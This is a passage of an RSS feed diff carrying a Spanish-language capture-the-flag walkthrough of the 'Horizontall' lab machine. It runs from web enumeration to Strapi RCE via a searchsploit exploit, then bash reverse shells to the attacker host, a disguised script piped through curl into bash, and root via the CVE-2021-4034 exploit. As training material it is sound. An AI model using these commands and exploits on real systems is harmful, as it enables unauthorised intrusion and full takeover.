+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/nmap_huf259710f5cff5a5b7d1e949246daf116_60380_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/nmap_huf259710f5cff5a5b7d1e949246daf116_60380_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;245&#34;
+		data-flex-basis=&#34;589px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Se puede observar que en el puerto 80 hay un redirect a &lt;a class=&#34;link&#34; href=&#34;http://horizontall.htb&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://horizontall.htb&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Para poder abrir la web se tiene que añadir al archivo &lt;code&gt;/etc/hosts&lt;/code&gt; una línea con:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;10.10.11.105      horizontall.htb&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Ejemplo:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/hosts.png&#34;
+	width=&#34;630&#34;
+	height=&#34;230&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/hosts_hu1e33643b250415aaa2447d46b894c5d0_20724_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/hosts_hu1e33643b250415aaa2447d46b894c5d0_20724_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;273&#34;
+		data-flex-basis=&#34;657px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;contenido-web&#34;&gt;Contenido Web&lt;/h3&gt;
+&lt;p&gt;Al entrar a la web lo primero que se ve es una página en la cual no funcionan los links&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/web-home.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1032&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/web-home_hu42ea7bdf69b9d25f78b8abae743b4d41_158284_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/web-home_hu42ea7bdf69b9d25f78b8abae743b4d41_158284_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;186&#34;
+		data-flex-basis=&#34;446px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;buscar-subdirectorios-wfuzz&#34;&gt;Buscar subdirectorios (wfuzz)&lt;/h3&gt;
+&lt;p&gt;Para ver si hay subdirectorios vamos a usar la herramienta wfuzz para fusear mediante un diccionario que está en &lt;code&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt; con el siguiente comando:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://horizontall.htb/FUZZ
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-c&lt;/td&gt;
+&lt;td&gt;Para que lo reporte todo con colores&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-t&lt;/td&gt;
+&lt;td&gt;Para configurar el tiempo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;hc=404&lt;/td&gt;
+&lt;td&gt;Para que no nos reporte los subdirectorios que no existan&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-w&lt;/td&gt;
+&lt;td&gt;Es donde se indica el diccionario&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;FUZZ&lt;/td&gt;
+&lt;td&gt;Se escribe donde quieres aplicar el diccionario&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/wfuzz.png&#34;
+	width=&#34;637&#34;
+	height=&#34;38&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/wfuzz_hu2e7129de7612626e3f1bef2b9ce280d2_6406_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/wfuzz_hu2e7129de7612626e3f1bef2b9ce280d2_6406_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1676&#34;
+		data-flex-basis=&#34;4023px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Solo ha encontrado 2 subdirectorios&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;js&lt;/li&gt;
+&lt;li&gt;css&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;buscar-subdominios-gobuster&#34;&gt;Buscar subdominios (gobuster)&lt;/h3&gt;
+&lt;p&gt;Con gobuster podemos buscar subdominios con el siguiente comando&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gobuster vhost -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u horizontall.htb
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Encontramos un subdominio llamado api-prod.horizontall.htb, otra forma de haberlo encontrado sin el gobuster es dandole a inspeccionar y después entrando al Depurador y ahí se puede ver que hay 2 js&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/inspecionar.png&#34;
+	width=&#34;311&#34;
+	height=&#34;205&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/inspecionar_huae93c1709bb614b6574a4bd05a955f1a_13785_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/inspecionar_huae93c1709bb614b6574a4bd05a955f1a_13785_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;151&#34;
+		data-flex-basis=&#34;364px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;El chunk-vendors.js&lt;/strong&gt;, como su nombre lo dice, es un paquete para todos los módulos que no son tuyos, sino de otras partes. Se denominan módulos de terceros o módulos de proveedores.&lt;/p&gt;
+&lt;p&gt;En cambio, el &lt;strong&gt;app.c68eb462.js&lt;/strong&gt; tiene un nombre raro, al abrirlo, (&lt;a class=&#34;link&#34; href=&#34;http://horizontall.htb/js/app.c68eb462.js&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://horizontall.htb/js/app.c68eb462.js&lt;/a&gt;) sale mucho texto, pero si se filtra por ejemplo .htb, podemos ver un subdominio:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://api-prod.horizontall.htb&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/subdomain.png&#34;
+	width=&#34;277&#34;
+	height=&#34;81&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/subdomain_hu9b7e3b8b57d861725211c9f70bfca555_7738_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/subdomain_hu9b7e3b8b57d861725211c9f70bfca555_7738_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;341&#34;
+		data-flex-basis=&#34;820px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Para poder entrar a la web se tiene que añadir el subdominio al &lt;code&gt;/etc/hosts&lt;/code&gt; como hicimos anteriormente de tal forma que quede así:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;10.10.11.105     horizontall.htb api-prod.horizontall.htb&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/hosts2.png&#34;
+	width=&#34;610&#34;
+	height=&#34;230&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/hosts2_hucdb8ac211291c932f3b3fb18b87a9e97_21225_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/hosts2_hucdb8ac211291c932f3b3fb18b87a9e97_21225_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;265&#34;
+		data-flex-basis=&#34;636px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Al entrar al api solo vemos una página en blanco con un título que pone welcome&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/web-api.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1027&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/web-api_hudacf53ea351f3b2a42c0a6e0a5d06c26_25309_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/web-api_hudacf53ea351f3b2a42c0a6e0a5d06c26_25309_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;186&#34;
+		data-flex-basis=&#34;448px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;buscar-subdirectorios-wfuzz-1&#34;&gt;Buscar subdirectorios (wfuzz)&lt;/h3&gt;
+&lt;p&gt;Para encontrar subdirectorios vamos a usar la misma herramienta que antes, wfuzz&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://api-prod.horizontall.htb/FUZZ
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-c&lt;/td&gt;
+&lt;td&gt;Para que lo reporte todo con colores&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-t&lt;/td&gt;
+&lt;td&gt;Para configurar el tiempo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;hc=404&lt;/td&gt;
+&lt;td&gt;Para que no nos reporte los subdirectorios que no existan&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-w&lt;/td&gt;
+&lt;td&gt;Es donde se indica el diccionario&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;FUZZ&lt;/td&gt;
+&lt;td&gt;Se escribe donde quieres aplicar el diccionario&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/wfuzz2.png&#34;
+	width=&#34;665&#34;
+	height=&#34;62&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/wfuzz2_hu42d13890827f620ad740e67e312e6e98_10341_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/wfuzz2_hu42d13890827f620ad740e67e312e6e98_10341_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1072&#34;
+		data-flex-basis=&#34;2574px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;El wfuzz ha encontrado 3 subdirectorios:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;admin&lt;/li&gt;
+&lt;li&gt;reviews&lt;/li&gt;
+&lt;li&gt;users&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;contenido-subdirectorios&#34;&gt;Contenido subdirectorios&lt;/h3&gt;
+&lt;p&gt;Probamos a entrar en reviews y vemos lo siguiente:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[{&amp;quot;id&amp;quot;:1,&amp;quot;name&amp;quot;:&amp;quot;wail&amp;quot;,&amp;quot;description&amp;quot;:&amp;quot;This is good service&amp;quot;,&amp;quot;stars&amp;quot;:4,&amp;quot;created_at&amp;quot;:&amp;quot;2021-05-29T13:23:38.000Z&amp;quot;,&amp;quot;updated_at&amp;quot;:&amp;quot;2021-05-29T13:23:38.000Z&amp;quot;},
+{&amp;quot;id&amp;quot;:2,&amp;quot;name&amp;quot;:&amp;quot;doe&amp;quot;,&amp;quot;description&amp;quot;:&amp;quot;i&#39;m satisfied with the product&amp;quot;,&amp;quot;stars&amp;quot;:5,&amp;quot;created_at&amp;quot;:&amp;quot;2021-05-29T13:24:17.000Z&amp;quot;,&amp;quot;updated_at&amp;quot;:&amp;quot;2021-05-29T13:24:17.000Z&amp;quot;},
+{&amp;quot;id&amp;quot;:3,&amp;quot;name&amp;quot;:&amp;quot;john&amp;quot;,&amp;quot;description&amp;quot;:&amp;quot;create service with minimum price i hop i can buy more in the futur&amp;quot;,&amp;quot;stars&amp;quot;:5,&amp;quot;created_at&amp;quot;:&amp;quot;2021-05-29T13:25:26.000Z&amp;quot;,
+  
+&amp;quot;updated_at&amp;quot;:&amp;quot;2021-05-29T13:25:26.000Z&amp;quot;}]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ya sabemos 3 usuarios:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;wail&lt;/li&gt;
+&lt;li&gt;doe&lt;/li&gt;
+&lt;li&gt;jhon&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Al entrar en el directorio admin nos mueve a admin/auth/login y hay un panel de login de strapi&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/strapi.png&#34;
+	width=&#34;507&#34;
+	height=&#34;452&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/strapi_hubd8abe14bfd84db76ca50c48de6fb902_18316_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/strapi_hubd8abe14bfd84db76ca50c48de6fb902_18316_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;112&#34;
+		data-flex-basis=&#34;269px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Haciendo una búsqueda por google podemos encontrar las credenciales default de strapi, admin:admin, pero no funcionan.&lt;/p&gt;
+&lt;h3 id=&#34;buscar-subdirectorios-sobre-admin-wfuzz&#34;&gt;Buscar subdirectorios sobre /admin/ (wfuzz)&lt;/h3&gt;
+&lt;p&gt;Para ver si hay más subdirectorios en /admin/ volvemos a usar wfuzz pero ahora sobre el directorio admin&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;wfuzz -c -t 200 --hc=404 --hh=854 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://api-prod.horizontall.htb/admin/FUZZ
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetros&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;-c&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Para que lo reporte todo con colores&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;-t&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Para configurar el tiempo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&amp;ndash;hc=404&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Para que no nos reporte los subdirectorios que no existan&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&amp;ndash;hh=854&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Es para que no muestre los subdirectorios con 854 caracteres&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;-w&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Es donde se indica el diccionario&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;FUZZ&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Se escribe donde se quiere aplicar el diccionario&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;p&gt;El wfuzz a encontrado 3 subdirectorios:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;plugins&lt;/li&gt;
+&lt;li&gt;layout&lt;/li&gt;
+&lt;li&gt;init&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Al entrar a init vemos lo siguiente&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;{&amp;quot;data&amp;quot;:
+{&amp;quot;uuid&amp;quot;:&amp;quot;a55da3bd-9693-4a08-9279-f9df57fd1817&amp;quot;,
+&amp;quot;currentEnvironment&amp;quot;:&amp;quot;development&amp;quot;,
+&amp;quot;autoReload&amp;quot;:false,
+&amp;quot;strapiVersion&amp;quot;:&amp;quot;3.0.0-beta.17.4&amp;quot;}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;buscar-posible-vulnerabilidad-searchsploit&#34;&gt;Buscar posible vulnerabilidad (searchsploit)&lt;/h3&gt;
+&lt;p&gt;Ahora tenemos la versión de strapi y con el comando searchsploit se puede buscar si es vulnerable: &lt;code&gt;searchsploit strapi 3.0.0-beta.17.4&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Nos muestra los siguientes exploits&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ searchsploit strapi 3.0.0-beta.17.4
+----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Exploit Title                                                                                                                                             |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                                                                 | multiple/webapps/50239.py
+Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)                                                                                   | nodejs/webapps/50716.rb
+----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;explotación-de-vulnerabilidades&#34;&gt;Explotación de Vulnerabilidades&lt;/h2&gt;
+&lt;p&gt;Ahora ya sabemos una vulnerabilidad (strapi), strapi es un CMS de código abierto basado en Node.js que te permite crear una API y gestionar su contenido&lt;/p&gt;
+&lt;p&gt;De los 2 exploits que reporto el serachsploit vamos a usar el que está hecho con python, lo pasamos al directorio actual y después lo ejecutamos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;searchsploit -m 50239.py
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;ejecutar-exploit&#34;&gt;Ejecutar Exploit&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;python3 50239.py http://api-prod.horizontall.htb
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Eso nos va a abrir una inyección de comandos en la cual no podemos ver la respuesta.&lt;/p&gt;
+&lt;h3 id=&#34;reverse-shell&#34;&gt;Reverse shell&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Primero nos ponemos en escucha por el puerto 443 con netcat&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc -nlvp 443
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Probamos a crear la reverse shell&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.19/443 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;No recibimos nada, Probamos añadiendo el bash -c&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.19/443 0&amp;gt;&amp;amp;1&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Tampoco la pilla, vamos a probar de crear un archivo .png con el comando de bash para la reverse shell, después con un curl lo vamos a mandar a la máquina a través de un servidor creado con python para que después lo ejecute con bash&lt;/p&gt;
+&lt;p&gt;Contenido de photo.png&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
+
+bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.19/443 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Abrimos un servidor con python por el puerto 80&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;python3 -m http.server 80
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Por último, en la inyección de comandos que nos dio el exploit, hacemos un curl&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl http://10.10.14.19/photo.png | bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;con un &lt;code&gt;ifconfig&lt;/code&gt; confirmamos que estamos en la 10.10.11.105&lt;/p&gt;
+&lt;p&gt;¡Ya tenemos una reverse shell!&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;escalada-de-privilegios&#34;&gt;Escalada de Privilegios&lt;/h2&gt;
+&lt;h3 id=&#34;tratamiento-de-la-tty&#34;&gt;Tratamiento de la tty&lt;/h3&gt;
+&lt;p&gt;Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;script /dev/null -c bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ctrl + z&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;stty raw -echo; fg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;reset
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export SHELL=bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export TERM=xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;flag-usuario&#34;&gt;Flag Usuario&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat /home/developer/user.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;flag-root&#34;&gt;Flag Root&lt;/h3&gt;
+&lt;p&gt;Después de buscar un rato, he encontrado que es vulnerable a &lt;a class=&#34;link&#34; href=&#34;https://github.com/berdav/CVE-2021-4034&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/berdav/CVE-2021-4034&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Los pasos para ejecutarlo son:&lt;/p&gt;
+&lt;p&gt;Clonar el repositorio de github en nuestra máquina&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/berdav/CVE-2021-4034
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Lo comprimimos&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;zip -r CVE-2021-4034
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Desde la máquina víctima y usando el mismo servidor con python de antes lo pasamos con wget&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;wget http://10.10.14.19:80/CVE-2021-4034.zip
+
+unzip CVE-2021-4034.zip
+
+cd CVE-2021-4034
+
+make
+
+./cve-2021-4034
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si hacemos un whoami ya somos root!!!&lt;/p&gt;
+&lt;p&gt;Para ver la flag hacemos un cat al root.txt&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cat /root/root.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;¡¡¡Máquina resuelta!!!&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
